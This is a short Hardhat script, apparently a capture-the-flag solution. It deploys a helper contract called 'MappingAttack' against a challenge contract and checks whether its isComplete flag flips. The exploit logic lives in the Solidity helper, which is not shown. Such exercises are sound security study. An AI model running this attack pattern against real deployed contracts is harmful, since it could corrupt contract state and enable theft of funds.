import { ethers } from "hardhat";

const contractAddress = "0x87C142fC8df9b66b739877cd6d92A8E98429F499";

const abi = [
  "function set(uint256 key, uint256 value) external",
  "function isComplete() public view returns (bool)",
];

const checkIsComplete = async () => {
  const provider = ethers.provider;
  const contract = new ethers.Contract(contractAddress, abi, provider);
  return await contract.isComplete();
};

const attack = async () => {
  // using a contract for the computations since that part is easier in Solidity
  const MappingAttack = await ethers.getContractFactory("MappingAttack");
  const mappingAttack = await MappingAttack.deploy(contractAddress);
  return await mappingAttack.deployed();
};

async function main() {
  const isCompleteStart = await checkIsComplete();
  console.log(`isCompleteStart: ${isCompleteStart}`);

  await attack();

  const isCompleteEnd = await checkIsComplete();
  console.log(`isCompleteEnd: ${isCompleteEnd}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
